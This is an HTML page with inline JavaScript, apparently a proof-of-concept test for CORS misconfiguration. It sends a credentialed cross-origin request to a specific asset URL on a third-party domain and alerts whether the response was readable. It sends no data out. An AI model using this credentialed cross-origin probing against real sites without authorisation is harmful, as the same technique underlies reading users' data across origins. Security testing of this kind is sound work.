<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Test</title>
</head>
<body>
    <h1>Hello Team World</h1>
    <p>Testing for CORS vulnerability.</p>

    <script>
        // Create an XMLHttpRequest object
        var xhr = new XMLHttpRequest();

        // Open a request to the target resource
        xhr.open('GET', 'https://c1.staticsfly.com/asset/fetch/cs/PZN_FRAME-337076-4064-MERCHLARGE_FRONT/thumbnail.preview/v1', true);

        // Indicate that credentials like cookies should be included
        xhr.withCredentials = true;

        // Handle the response
        xhr.onload = function() {
            if (xhr.status === 200) {
                alert('CORS Vulnerability: The image was accessed!');
            } else {
                alert('CORS test failed.');
            }
        };

        // Handle any errors that occur
        xhr.onerror = function() {
            alert('Request failed. CORS misconfiguration may not exist.');
        };

        // Send the request
        xhr.send();
    </script>
</body>
</html>
